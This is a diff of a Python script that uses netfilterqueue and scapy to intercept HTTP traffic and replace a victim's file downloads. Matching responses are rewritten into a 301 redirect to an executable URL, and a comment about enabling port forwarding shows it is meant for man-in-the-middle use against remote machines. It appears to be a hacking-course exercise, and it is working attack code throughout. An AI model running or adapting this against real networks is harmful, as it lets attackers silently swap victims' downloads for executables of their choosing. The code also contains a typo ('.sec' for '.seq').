@@ -3,6 +3,17 @@ import netfilterqueue
 from scapy.layers.inet import IP, TCP
 from scapy.layers.dns import Raw
 
+rar_load = "301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
+def set_load(packet, load):
+    packet[Raw].load = load
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[TCP].chksum
+    return packet
+
+# for working a remote machine need to enable port forwarding.
+# I have a check from a previous component -- TODO find it.
+
 ack_list = []
 def process_packet(packet):
     scapy_packet= IP(packet.get_payload())
@@ -18,14 +29,11 @@ def process_packet(packet):
             if scapy_packet[TCP].sec in ack_list:
                 ack_list.remove(scapy_packet[TCP].seq)
                 print("[+] Replacing File: ")
-                scapy_packet[Raw].load = "301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
-                del scapy_packet[IP].len
-                del scapy_packet[IP].chksum
-                del scapy_packet[TCP].chksum
-                packet.set_payload(str(scapy_packet))
-                return packet
+
+                modified_packet = set_load(scapy_packet, rar_load)
+                packet.set_payload(str(modified_packet))
     packet.accept()
-    return None 
+    return None
 
 if __name__ == "__main__":
     queue = netfilterqueue.NetfilterQueue()
